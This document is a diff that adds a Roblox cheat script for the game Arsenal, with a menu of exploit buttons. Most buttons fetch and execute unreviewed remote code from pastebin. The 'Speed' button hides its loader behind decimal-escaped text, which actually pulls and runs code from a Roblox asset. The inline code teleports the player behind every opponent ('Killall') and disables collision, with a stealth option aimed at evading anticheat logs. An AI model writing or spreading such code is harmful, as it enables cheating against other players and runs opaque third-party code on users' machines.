@@ -1,0 +1,140 @@
+-- Request To Don't Edit The Scirpt Or No Work!
+local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()
+
+local w = library:CreateWindow("Arsenal") -- Creates the window
+
+local a = w:CreateFolder("In-Game") -- Creates the folder(U will put here your buttons,etc)
+
+a:Label("In-Game",{
+    TextSize = 25; -- Self Explaining
+    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
+    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
+    
+})
+
+a:Button("Esp",function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/UaZxki2v", true))()
+end)
+
+a:Button("Fast Fire",function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/SVVX3QNh" ,true))()
+end)
+
+a:Button("Hitbox",function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RrTbsWa4",true))()
+end)
+
+a:Button("InvisHitBx",function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/KpQhjvRQ",true))()
+end)
+
+a:Button("Killall",function()
+    print("Script made by FramzDev#8283")
+local c = workspace.CurrentCamera
+local lplr = game.Players.LocalPlayer
+
+function a(p)
+if p and p.Character then
+pcall(function()
+local t = p.Character.PrimaryPart.CFrame * Vector3.new(0, -0.25, 0)
+c.CFrame = CFrame.new(c.Focus.p, t) * CFrame.new(0, 0, 0.5)
+end)
+end
+end
+for i=1,10 do
+for _,v in pairs(game.Players:GetPlayers()) do
+pcall(function()
+for i=1,15 do
+lplr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame - v.Character.HumanoidRootPart.CFrame.LookVector*4
+a(v)
+wait()
+end
+end)
+end
+end
+end)
+
+local b = w:CreateFolder("Other") -- Creates the folder(U will put here your buttons,etc)
+
+b:Label("Other",{
+    TextSize = 25; -- Self Explaining
+    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
+    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
+    
+})
+
+b:Button("RGBGun",function()
+    local c = 1 function zigzag(X)  return math.acos(math.cos(X * math.pi)) / math.pi end game:GetService("RunService").RenderStepped:Connect(function()  if game.Workspace.Camera:FindFirstChild('Arms') then   for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    if v.ClassName == 'MeshPart' then      v.Color = Color3.fromHSV(zigzag(c),1,1)     c = c + .0001    end   end  end end)
+end)
+
+b:Button("Speed",function()
+    net = true -- if false = do nothing
+notify = false -- set this to false if u don't want to see notiflication
+
+
+loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()
+
+wait(0)
+game.StarterGui:SetCore("SendNotification", {
+Title = "âœ…!";
+Text = "Net Bypass Activated.";
+})
+end)
+
+b:Button("Aimbot",function()
+loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
+end)
+
+b:Button("NoClip",function()
+local StealthMode = true -- If game has an anticheat that checks the logs
+
+local Indicator
+
+if not StealthMode then
+    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+    print("NOCLIP: Press Q to Activate")
+    Indicator = Instance.new("TextLabel", ScreenGui)
+    Indicator.AnchorPoint = Vector2.new(0, 1)
+    Indicator.Position = UDim2.new(0, 0, 1, 0)
+    Indicator.Size = UDim2.new(0, 200, 0, 50)
+    Indicator.BackgroundTransparency = 1
+    Indicator.TextScaled = true
+    Indicator.TextStrokeTransparency = 0
+    Indicator.TextColor3 = Color3.new(0, 0, 0)
+    Indicator.TextStrokeColor3 = Color3.new(1, 1, 1)
+    Indicator.Text = "Noclip: Enabled"
+end
+
+local noclip = true
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+local mouse = player:GetMouse()
+
+mouse.KeyDown:Connect(function(key)
+    if key == "q" then
+        noclip = not noclip
+
+        if not StealthMode then
+            Indicator.Text = "Noclip: " .. (noclip and "Enabled" or "Disabled")
+        end
+    end
+end)
+
+while true do
+    player = game.Players.LocalPlayer
+    character = player.Character
+
+    if noclip then
+        for _, v in pairs(character:GetDescendants()) do
+            pcall(function()
+                if v:IsA("BasePart") then
+                    v.CanCollide = false
+                end
+            end)
+        end
+    end
+
+    game:GetService("RunService").Stepped:wait()
+end
+end)
